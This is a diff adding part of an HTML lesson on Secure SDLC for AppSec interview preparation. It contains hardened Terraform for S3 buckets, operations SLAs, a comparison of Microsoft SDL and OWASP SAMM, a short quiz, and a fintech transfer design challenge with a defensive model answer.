+resource <span class="c-str">"aws_s3_bucket"</span> <span class="c-str">"data"</span> {
+  bucket = <span class="c-str">"my-company-data"</span>
+}
+<span class="line-good">resource <span class="c-str">"aws_s3_bucket_public_access_block"</span> <span class="c-str">"data"</span> {</span>
+<span class="line-good">  bucket                  = aws_s3_bucket.data.id</span>
+<span class="line-good">  block_public_acls       = <span class="c-orange">true</span>           <span class="c-muted"># CKV_AWS_53</span></span>
+<span class="line-good">  block_public_policy     = <span class="c-orange">true</span>           <span class="c-muted"># CKV_AWS_54</span></span>
+<span class="line-good">  ignore_public_acls      = <span class="c-orange">true</span>           <span class="c-muted"># CKV_AWS_55</span></span>
+<span class="line-good">  restrict_public_buckets = <span class="c-orange">true</span>           <span class="c-muted"># CKV_AWS_56</span></span>
+<span class="line-good">}</span>
+<span class="line-good">resource <span class="c-str">"aws_s3_bucket_server_side_encryption_configuration"</span> <span class="c-str">"data"</span> {</span>
+<span class="line-good">  bucket = aws_s3_bucket.data.id</span>
+<span class="line-good">  rule { apply_server_side_encryption_by_default { sse_algorithm = <span class="c-str">"AES256"</span> } }</span>
+<span class="line-good">}</span>
+<span class="line-good">resource <span class="c-str">"aws_s3_bucket_versioning"</span> <span class="c-str">"data"</span> {</span>
+<span class="line-good">  bucket = aws_s3_bucket.data.id</span>
+<span class="line-good">  versioning_configuration { status = <span class="c-str">"Enabled"</span> }</span>
+<span class="line-good">}</span>
+</pre>
+        </div>
+      </div>
+
+      <!-- Principle of Immutable Infra -->
+      <div class="phase-panel" id="pan-immutable">
+        <div class="phase-panel-header" onclick="togglePanel('pan-immutable')">
+          <div class="phase-dot" style="background:var(--phase-deploy)"></div>
+          <div class="phase-panel-title">Immutable infrastructure: never SSH into production</div>
+          <div class="phase-panel-sub">If you can SSH in, an attacker can too — or worse, an insider can</div>
+          <div class="phase-panel-toggle">▼</div>
+        </div>
+        <div class="phase-panel-body">
+          <p>Immutable infrastructure means you never modify a running server. Instead, you build a new image, test it, and deploy it — then destroy the old server. No SSH access in production. No manual changes. No config drift. This eliminates an entire attack surface: no running SSH daemon means no SSH brute force, no key theft, no interactive attacker sessions.</p>
+
+          <div class="flow-diagram">
+            <div class="flow-node bad-node"><div class="fn-title">Mutable</div><div class="fn-sub">SSH into prod, run apt upgrade, edit config files</div></div>
+            <div class="flow-arrow-box">vs</div>
+            <div class="flow-node good-node"><div class="fn-title">Build</div><div class="fn-sub">New Docker image with change applied</div></div>
+            <div class="flow-arrow-box">→</div>
+            <div class="flow-node good-node"><div class="fn-title">Test</div><div class="fn-sub">Trivy scan + smoke tests on new image</div></div>
+            <div class="flow-arrow-box">→</div>
+            <div class="flow-node good-node"><div class="fn-title">Deploy</div><div class="fn-sub">Rolling deploy of new containers</div></div>
+            <div class="flow-arrow-box">→</div>
+            <div class="flow-node good-node"><div class="fn-title">Destroy</div><div class="fn-sub">Old containers terminated — no drift, no attack surface</div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PHASE 6: OPERATIONS -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-eyebrow" style="color:var(--phase-ops)">Phase 6 — Operations</div>
+        <div class="section-title">Runtime monitoring, patch SLAs, and incident response</div>
+        <p class="section-desc">Security doesn't stop at deployment. Production is where the real attackers show up.</p>
+      </div>
+
+      <table>
+        <tr><th>Activity</th><th>What it is</th><th>Tool(s)</th><th>SLA / Target</th></tr>
+        <tr>
+          <td style="font-weight:600">Vulnerability patching</td>
+          <td>Apply CVE fixes to dependencies and OS packages</td>
+          <td>Dependabot, Snyk, MSRC alerts</td>
+          <td>CRITICAL: 24h. HIGH: 7 days. MEDIUM: 30 days. LOW: best-effort.</td>
+        </tr>
+        <tr>
+          <td style="font-weight:600">Security monitoring</td>
+          <td>Detect attacks in progress</td>
+          <td>AWS GuardDuty, Datadog SIEM, Splunk</td>
+          <td>Real-time alerting. Mean-time-to-detect &lt; 1 hour.</td>
+        </tr>
+        <tr>
+          <td style="font-weight:600">Audit log review</td>
+          <td>Check for anomalous access patterns</td>
+          <td>CloudTrail, SIEM correlation rules</td>
+          <td>Automated alerts on anomalies. Manual review weekly.</td>
+        </tr>
+        <tr>
+          <td style="font-weight:600">Penetration testing</td>
+          <td>Manual adversarial security testing</td>
+          <td>Internal red team or external firm</td>
+          <td>At least annually. After major features. Pre-launch.</td>
+        </tr>
+        <tr>
+          <td style="font-weight:600">Incident response</td>
+          <td>Contain, investigate, and recover from breaches</td>
+          <td>IR playbooks, PagerDuty, SIEM</td>
+          <td>Documented plan rehearsed quarterly via tabletop exercises.</td>
+        </tr>
+        <tr>
+          <td style="font-weight:600">Security retrospectives</td>
+          <td>Feed production findings back to requirements phase</td>
+          <td>Jira tickets, threat model updates</td>
+          <td>Every incident generates at least one process improvement.</td>
+        </tr>
+      </table>
+
+      <div class="callout callout-info">
+        <div class="callout-icon">ℹ️</div>
+        <div class="callout-text"><strong>The feedback loop — why Ops feeds back to Requirements:</strong> Every security incident in production is a Secure SDLC failure somewhere upstream. A SQL injection in prod means threat modeling missed it (Design) AND SAST didn't catch it (Dev) AND DAST didn't catch it (Test). Your incident retrospective should trace the root cause back to the SDLC phase where it should have been caught and fix the process — not just the vulnerability.</div>
+      </div>
+    </div>
+
+    <!-- MICROSOFT SDL — MATURITY MODEL -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-eyebrow">Real-World Framework</div>
+        <div class="section-title">Microsoft SDL vs OWASP SAMM: which model to use</div>
+        <p class="section-desc">Two major industry frameworks implement Secure SDLC. You'll encounter both — here's how they differ.</p>
+      </div>
+
+      <table>
+        <tr><th>Framework</th><th>Full Name</th><th>Origin</th><th>Best For</th><th>Structure</th></tr>
+        <tr>
+          <td style="font-weight:600;color:var(--blue)">Microsoft SDL</td>
+          <td>Security Development Lifecycle</td>
+          <td>Microsoft, 2004 (after Windows XP hacking wave)</td>
+          <td>Teams starting Secure SDLC from scratch. Prescriptive and actionable.</td>
+          <td>12 practices organized by SDLC phase. Each has required and recommended activities.</td>
+        </tr>
+        <tr>
+          <td style="font-weight:600;color:var(--green)">OWASP SAMM</td>
+          <td>Software Assurance Maturity Model</td>
+          <td>OWASP, open-source</td>
+          <td>Measuring and improving existing security programs. Benchmarking.</td>
+          <td>5 business functions × 3 security practices × 3 maturity levels = measurable score (0–3).</td>
+        </tr>
+      </table>
+
+      <div class="callout callout-tip">
+        <div class="callout-icon">💡</div>
+        <div class="callout-text"><strong>Interview answer:</strong> "Our team follows a Secure SDLC model based on OWASP SAMM for measuring maturity. We currently operate at Level 2 in Secure Build (SAST + SCA in CI) and Level 1 in Threat Assessment (threat modeling on new features). Our roadmap targets Level 3 in Secure Build by Q4." This demonstrates you understand not just what Secure SDLC is, but how to measure and improve it.</div>
+      </div>
+    </div>
+
+    <!-- KNOWLEDGE CHECK -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-eyebrow">Knowledge Check</div>
+        <div class="section-title">Test your Secure SDLC knowledge</div>
+        <p class="section-desc">Questions you will face in AppSec interviews</p>
+      </div>
+
+      <div class="quiz-block">
+        <div class="quiz-q">Q1. A developer commits an AWS access key to a public GitHub repo. It's discovered 3 hours later. List the correct incident response steps in order — and why "deleting the commit" is not enough.</div>
+        <div class="quiz-options" id="q1">
+          <div class="quiz-opt" onclick="quiz('q1',this,'wrong')">Delete the file, push the commit, and notify GitHub Security</div>
+          <div class="quiz-opt" onclick="quiz('q1',this,'wrong')">Run git rm, force push, add to .gitignore, rotate key within a week</div>
+          <div class="quiz-opt" onclick="quiz('q1',this,'correct')">Immediately revoke/rotate the key → clean git history with git filter-repo → force push → audit CloudTrail for usage → notify affected teams</div>
+          <div class="quiz-opt" onclick="quiz('q1',this,'wrong')">Make the repo private, delete the commit, no rotation needed if caught fast</div>
+        </div>
+        <div class="quiz-exp" id="q1-exp">The key is: <strong>rotate first, always</strong>. Git history exists in every clone, fork, and GitHub's own cache. Even if you delete it, it was visible for 3 hours and may have been scraped by automated secret-hunting bots (they scan GitHub in real time). Rotation happens before any cleanup. Then use <code>git filter-repo</code> (not git rm) to rewrite history and force push. Then audit CloudTrail/access logs to see if the key was used during those 3 hours.</div>
+      </div>
+
+      <div class="quiz-block">
+        <div class="quiz-q">Q2. Your Semgrep SAST scan is generating 400 findings per week, but developers are ignoring them all. What is the process failure, and how do you fix it?</div>
+        <div class="quiz-options" id="q2">
+          <div class="quiz-opt" onclick="quiz('q2',this,'wrong')">Replace Semgrep with a different SAST tool</div>
+          <div class="quiz-opt" onclick="quiz('q2',this,'correct')">The tool is not tuned — too many false positives = alert fatigue. Fix: create a baseline, suppress known false positives, focus only on HIGH/CRITICAL, and define a triage SLA so developers know what's expected</div>
+          <div class="quiz-opt" onclick="quiz('q2',this,'wrong')">Make SAST results mandatory to fix before merge for all severity levels</div>
+          <div class="quiz-opt" onclick="quiz('q2',this,'wrong')">Remove SAST from CI to reduce developer friction</div>
+        </div>
+        <div class="quiz-exp" id="q2-exp">Alert fatigue is the #1 reason security tooling fails. When everything is flagged, nothing is prioritized. The fix is <strong>signal-to-noise ratio</strong>: (1) Create a baseline scan of existing code so only new findings are surfaced, (2) Write a suppression policy for confirmed false positives, (3) Auto-fail only on HIGH/CRITICAL — everything else goes to a ticket backlog, (4) Define a sprint-level SLA: e.g., developers triage HIGH findings within 1 sprint. This is a people-and-process problem, not a tool problem.</div>
+      </div>
+
+      <div class="quiz-block">
+        <div class="quiz-q">Q3. At which Secure SDLC phase is it cheapest to fix a "broken access control" vulnerability, and why?</div>
+        <div class="quiz-options" id="q3">
+          <div class="quiz-opt" onclick="quiz('q3',this,'wrong')">Testing phase — because DAST can detect it automatically</div>
+          <div class="quiz-opt" onclick="quiz('q3',this,'wrong')">Development phase — because the developer who wrote the bug can fix it immediately</div>
+          <div class="quiz-opt" onclick="quiz('q3',this,'correct')">Requirements/Design phase — because the authorization model can be designed correctly from the start, avoiding hundreds of individual code fixes later</div>
+          <div class="quiz-opt" onclick="quiz('q3',this,'wrong')">Operations phase — because you have real attack data to guide the fix</div>
+        </div>
+        <div class="quiz-exp" id="q3-exp">Broken access control is an <em>architectural</em> vulnerability. If you design a centralized authorization middleware in the design phase, every endpoint gets access control for free. If you skip this, every developer must remember to add an <code>if user.owns(resource)</code> check on every single endpoint — and some will forget. Fixing that in production means auditing 500 endpoints one by one. The IBM 100× cost ratio is exactly about this: design decisions cost minutes to make, production fixes cost weeks.</div>
+      </div>
+    </div>
+
+    <!-- CHALLENGE -->
+    <div class="challenge-wrap">
+      <div class="challenge-eyebrow">Hands-On Challenge</div>
+      <h3>Design the Secure SDLC for a new feature</h3>
+      <div class="ch-desc">You are the AppSec engineer at a fintech startup. Your team is building a new feature: "Instant bank transfer — users can transfer up to $10,000 by entering a recipient's bank account number." Apply the Secure SDLC framework to this feature.</div>
+
+      <div class="ch-scenario">
+        <p><strong>The feature request from the product team:</strong><br>
+        "Users enter an IBAN (bank account number) and an amount. We call the bank's payment API. The transfer is debited immediately. User sees a confirmation screen. Simple!"<br><br>
+        <strong>Your job:</strong> For each of the 6 SDLC phases, write at least 1 security activity or control specific to this feature. Think about: what could go wrong? What must be validated? What must be logged? What does the design need to include that the product team hasn't mentioned?</p>
+      </div>
+
+      <textarea id="ch-ans" placeholder="Phase 1 — Requirements: ...
+Phase 2 — Design: ...
+Phase 3 — Development: ...
+Phase 4 — Testing: ...
+Phase 5 — Deployment: ...
+Phase 6 — Operations: ..."></textarea>
+
+      <div class="btn-row">
+        <button class="btn btn-primary" onclick="checkChallenge()">Submit</button>
+        <button class="btn btn-ghost" onclick="revealChallenge()">Reveal model answer</button>
+      </div>
+
+      <div class="ch-feedback" id="ch-fb"></div>
+    </div>
+
+    <!-- SUMMARY -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-eyebrow">Quick Reference</div>
+        <div class="section-title">Secure SDLC cheat sheet</div>
+      </div>
+
+      <table>
+        <tr><th>Phase</th><th>Key Security Activity</th><th>Primary Tool(s)</th><th>What fails without it</th></tr>
+        <tr><td style="color:var(--phase-req);font-weight:600">Requirements</td><td>Abuse cases + compliance mapping</td><td>JIRA, confluence, compliance checklist</td><td>Features shipped with no security requirements → rework in prod</td></tr>
+        <tr><td style="color:var(--phase-design);font-weight:600">Design</td><td>Threat modeling (STRIDE on DFDs)</td><td>Microsoft Threat Modeling Tool, OWASP Threat Dragon</td><td>Architecture flaws discovered in pentest → can't fix without redesign</td></tr>
+        <tr><td style="color:var(--phase-dev);font-weight:600">Development</td><td>SAST + pre-commit hooks + secure coding</td><td>Semgrep, Bandit, detect-secrets, pre-commit</td><td>Injection, XSS, hardcoded secrets shipped to staging/prod</td></tr>
+        <tr><td style="color:var(--phase-test);font-weight:600">Testing</td><td>DAST + SCA + pentest</td><td>OWASP ZAP, Snyk, Burp Suite</td><td>Runtime vulns and vulnerable deps not caught before release</td></tr>
+        <tr><td style="color:var(--phase-deploy);font-weight:600">Deployment</td><td>IaC scanning + secrets injection + hardening</td><td>Checkov, Vault, CIS Benchmarks</td><td>Cloud misconfigs, public buckets, secrets in environment variables</td></tr>
+        <tr><td style="color:var(--phase-ops);font-weight:600">Operations</td><td>Monitoring + patching SLAs + IR plan</td><td>Datadog, GuardDuty, PagerDuty, SIEM</td><td>Breaches go undetected for months; no plan when incident happens</td></tr>
+      </table>
+    </div>
+
+    <!-- NAV FOOTER -->
+    <div class="lesson-nav-footer">
+      <a class="nav-btn-prev" href="#">
+        <span class="nav-dir">← Previous</span>
+        <span class="nav-title">01 — OWASP Top 10 2021</span>
+      </a>
+      <a class="nav-btn-next" href="#">
+        <span class="nav-dir">Next Lesson →</span>
+        <span class="nav-title">03 — Threat Modeling (STRIDE, PASTA)</span>
+      </a>
+    </div>
+
+  </div><!-- /content -->
+</div><!-- /main -->
+
+<script>
+// Phase pipeline toggle
+function activatePhase(id) {
+  document.querySelectorAll('.phase-block').forEach(b => b.classList.remove('active-phase'));
+  const el = document.getElementById('ph-' + id);
+  if (el) el.classList.add('active-phase');
+}
+activatePhase('req');
+
+// Panel toggle
+function togglePanel(id) {
+  const el = document.getElementById(id);
+  el.classList.toggle('open');
+}
+// Open first panel by default
+document.getElementById('pan-input').classList.add('open');
+
+// Quiz
+function quiz(qid, el, result) {
+  const container = document.getElementById(qid);
+  const opts = container.querySelectorAll('.quiz-opt');
+  opts.forEach(o => { o.onclick = null; });
+  if (result === 'correct') {
+    el.classList.add('correct');
+  } else {
+    el.classList.add('wrong');
+    opts.forEach(o => {
+      if (!o.classList.contains('wrong') && !o.classList.contains('correct')) {
+        // don't mark others automatically
+      }
+    });
+  }
+  document.getElementById(qid + '-exp').classList.add('show');
+}
+
+// Challenge
+function checkChallenge() {
+  const ans = document.getElementById('ch-ans').value.toLowerCase();
+  const fb = document.getElementById('ch-fb');
+  const checks = [
+    ans.includes('iban') || ans.includes('validat') || ans.includes('format'),
+    ans.includes('rate limit') || ans.includes('mfa') || ans.includes('2fa') || ans.includes('authentication'),
+    ans.includes('parameteriz') || ans.includes('sast') || ans.includes('input'),
+    ans.includes('dast') || ans.includes('pentest') || ans.includes('test'),
+    ans.includes('log') || ans.includes('audit') || ans.includes('secret') || ans.includes('vault'),
+    ans.includes('monitor') || ans.includes('alert') || ans.includes('incident'),
+  ];
+  const score = checks.filter(Boolean).length;
+  fb.className = 'ch-feedback show ' + (score >= 5 ? 'good' : score >= 3 ? 'hint' : 'hint');
+  if (score >= 5) {
+    fb.innerHTML = `🎯 Excellent — you covered ${score}/6 phases with relevant security activities. You're thinking like an AppSec engineer. One bonus question: did you include MFA or step-up authentication for transfers over a certain threshold? That's a common design requirement for high-value financial operations.`;
+  } else if (score >= 3) {
+    fb.innerHTML = `✅ Good start — you covered ${score}/6 phases. Think about what you missed. Key hints: the IBAN format needs allowlist validation (regex). Rate limiting is critical — $10k transfers with no rate limit means an attacker with a stolen account can drain it instantly. Every transfer must be logged with user_id, timestamp, amount, destination — that's your audit trail for fraud investigation.`;
+  } else {
+    fb.innerHTML = `⚠️ Try to address all 6 phases. Think about: Phase 1 — what security requirements must this feature have? (amount limits, MFA for high-value transfers). Phase 2 — what's the STRIDE threat for the transfer API call? Phase 3 — how do you validate the IBAN format? Phase 4 — how do you test for business logic abuse?`;
+  }
+}
+
+function revealChallenge() {
+  const fb = document.getElementById('ch-fb');
+  fb.className = 'ch-feedback show reveal';
+  fb.innerHTML = `
+    <strong>Model Answer:</strong><br><br>
+    <strong>Phase 1 — Requirements:</strong> Security requirements: (1) MFA required for transfers over $500. (2) Max 3 transfers per hour per account. (3) IBAN must be validated to ISO 13616 standard. (4) Amount must be positive, max $10,000, 2 decimal places only. (5) Transfers must be logged for 7 years (financial regulation). (6) User must confirm transfer via secondary channel (email/SMS) for new recipients.<br><br>
+    <strong>Phase 2 — Design:</strong> STRIDE on the payment flow: Tampering threat on the amount field → HMAC-signed request to bank API. Repudiation → immutable audit log with user_id, timestamp, amount, IBAN, IP. DoS → rate limiter at API gateway layer (not application layer). Privilege escalation → only the authenticated account owner can initiate transfers from their account (IDOR check).<br><br>
+    <strong>Phase 3 — Development:</strong> IBAN validated with allowlist regex <code>^[A-Z]{2}[0-9]{2}[A-Z0-9]{4}[0-9]{7}([A-Z0-9]?){0,16}$</code>. Amount parsed as <code>Decimal</code> — never float (float math errors in money = critical bug). Parameterized query for saving transfer record. Pre-commit hooks catch hardcoded bank API keys. SAST run on PR.<br><br>
+    <strong>Phase 4 — Testing:</strong> Pentest specifically targets: can I change the amount after signing? (parameter tampering). Can I IDOR to initiate from another user's account? Can I bypass the rate limit by rotating IPs? DAST tests all endpoint params. Test edge cases: negative amounts, amounts of "0.001", unicode in IBAN field.<br><br>
+    <strong>Phase 5 — Deployment:</strong> Bank API key stored in Vault, injected at runtime — never in Dockerfile or env file. IaC scan confirms the payment service network segment can only reach the bank API endpoint, not the full internet. Immutable deployment — no SSH access to payment service containers.<br><br>
+    <strong>Phase 6 — Operations:</strong> Alert fires if: more than 3 transfers from one account in 1 hour, transfer to a new IBAN never used before (fraud signal), total daily transfer volume exceeds $50k for an account (fraud signal). CloudTrail logs every API call to bank. Incident response playbook specific to payment fraud — contact bank's fraud team within 15 minutes of confirmed fraudulent transfer.`;
+}
+</script>
+</body>
+</html>
